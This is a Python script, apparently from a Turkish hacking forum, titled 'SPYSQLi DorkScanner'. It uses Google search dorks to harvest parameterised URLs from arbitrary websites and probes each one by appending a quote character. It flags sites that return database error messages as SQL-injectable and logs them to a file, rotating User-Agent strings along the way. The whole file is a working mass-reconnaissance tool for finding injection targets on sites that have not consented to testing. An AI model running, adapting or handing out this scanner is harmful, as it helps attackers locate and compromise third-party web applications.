import argparse
import urllib.parse as urlparse
import urllib.request as urllib2
import random
import re
import sys
import socket
import json
import http.client as httplib

# Renkli konsol çıktıları (Linux/Windows platformlarına göre)
if sys.platform in ["linux", "linux2"]:
    R = "\033[31m"
    W = "\033[0;1m"
    B = "\033[35m"
    G = "\033[32m"
    glp = "\033[2m"
    Y = "\033[33;1m"
else:
    R = ""
    W = ""
    Y = ""
    B = ""
    G = ""
    glp = ""

filename = "vuln.txt"
finallist = []

# User-Agent listesi
header = [
    'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2pre) Gecko/20100207 Ubuntu/9.04 Namoroka/3.6.2pre',
    'Mozilla/5.0 (Windows NT 6.0; rv:1.9.0.6)',
    'Opera/8.00 (Windows NT 5.1; U; en)',
    'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
]

# SQL Hata Mesajları
errors = {
    'MySQL': 'error in your SQL syntax',
    'Oracle': 'ORA-01756',
    'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
    'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
    'Syntax error': 'Syntax error'
}

# Web tarama işlemi
def cek():
    print(W + "-" * 43)
    hasil = []
    for url in finallist:
        print(R + "[!] " + W + "Web Vuln Taraniyor..\r", end="")
        sys.stdout.flush()
        EXT = "'"
        host = url + EXT
        try:
            req = urllib2.Request(host)
            req.add_header('User-Agent', random.choice(header))
            response = urllib2.urlopen(req)
            source = response.read().decode('utf-8', 'ignore')
            for type, eMSG in errors.items():
                if re.search(eMSG, source):
                    print(B + "[+]" + G + " Vuln  " + W + ": " + host.replace("'", ""))
                    print(B + "[*]" + R + " Error " + W + ": " + glp + type + W)
                    hasil.append(host.replace("'", ""))
        except Exception as e:
            print(R + "[!] " + W + f"Error: {e}")

    if len(hasil) > 0:
        print(W + "-" * 43)
        print(R + "[!] " + W + "Vuln web kaydediliyor..")
        with open(filename, "a") as vuln:
            for x in hasil:
                vuln.write(x + "\n")
        print(B + "[+] " + G + "Başarıyla kaydedildi: " + W + filename)
        print(B + "[*] " + G + "Toplam web vuln: " + W + str(len(hasil)))
    print(W + "-" * 43 + '\n')

# Web arama işlemi
def cari(inurl, site, maxc, api_key):
    print(R + "[!] " + W + "Lütfen Bekleyin..")
    urls = []
    page = 1

    try:
        while page <= int(maxc):
            query = f'{inurl} site:{site}'
            query = urlparse.quote(query)  # Özel karakterleri URL güvenli biçime dönüştür
            results_web = f'https://www.googleapis.com/customsearch/v1?q={query}&key={api_key}&cx={cx}&start={page * 10 - 9}'
            request_web = urllib2.Request(results_web)
            request_web.add_header('User-Agent', random.choice(header))
            response = urllib2.urlopen(request_web)
            result = json.load(response)

            for item in result.get('items', []):
                link = item.get('link')
                if link and link not in urls:
                    if re.search(r'\(', link) or re.search("<", link) or re.search("\A/", link) or re.search("\A(http://)\d", link):
                        pass
                    elif re.search("google", link) or re.search("youtube", link):
                        pass
                    else:
                        urls.append(link)

            percent = int((1.0 * page / int(maxc)) * 100)
            urls_len = len(urls)
            sys.stdout.write(f"\r[*] Urls: {urls_len} | Yüzde: {percent}% | Sayfa: {page} [*]")
            sys.stdout.flush()
            page += 1

    except KeyboardInterrupt:
        print(R + "\r-- " + W + "Kullanıcı tarafından kesildi.")
        sys.exit()
    except urllib2.URLError as e:
        print(R + "\r-- " + W + "Hata " + R + "-- " + W + f": {e}")
        sys.exit()
    except socket.error as s:
        print(R + "\r-- " + W + "Hata " + R + "-- " + W + f": {s}")
        sys.exit()
    except httplib.IncompleteRead as h:
        print(R + "\r-- " + W + "Hata " + R + "-- " + W + f": {h}")
        sys.exit()

    tmplist = []
    for url in urls:
        try:
            host = url.split("/", 3)
            domain = host[2]
            if domain not in tmplist and "=" in url:
                finallist.append(url)
                tmplist.append(domain)
        except Exception as e:
            print(R + "[!] " + W + f"Error processing URL: {e}")

    print("\n" + W + "-" * 43)
    print(B + "[+] " + G + f"Urls (sorted): {len(finallist)} Url")
    return finallist

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='SPYSQLi DorkScanner - Spyhackerz.org')
    parser.add_argument('--token', required=True, help='Google API key')
    args = parser.parse_args()

    api_key = args.token
    cx = 'YOUR_SEARCH_ENGINE_ID'  # Özelleştirilmiş arama motoru ID'nizi buraya ekleyin

    print("SPYSQLi DorkScanner - Spyhackerz.org")
    print(W + "-" * 43)
    inurl = input(B + "[?]" + G + " Dork girin: " + W)
    site = input(B + "[?]" + G + " Site kodu girin: " + W)
    maxc = input(B + "[?]" + G + " Kaç Sayfa aratilacak: " + W)
    print(W + "-" * 43)
    cari(inurl, site, maxc, api_key)
    cek()
